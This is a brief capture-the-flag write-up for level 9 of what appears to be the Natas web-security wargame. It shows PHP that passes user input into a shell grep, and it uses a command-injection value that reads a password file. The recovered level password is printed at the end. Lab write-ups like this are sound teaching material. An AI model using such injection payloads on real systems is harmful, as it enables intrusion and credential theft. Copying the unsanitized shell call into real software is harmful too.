# Level 9
First, clicking on view source shows some PHP code, of interest is:
<code>  
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
</code>  
The passthru function in PHP does not perform input validation. I can take advantage of this by passing in *; cat /etc/natas_webpass/natas10 #*

I get the following password: <ins>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</ins>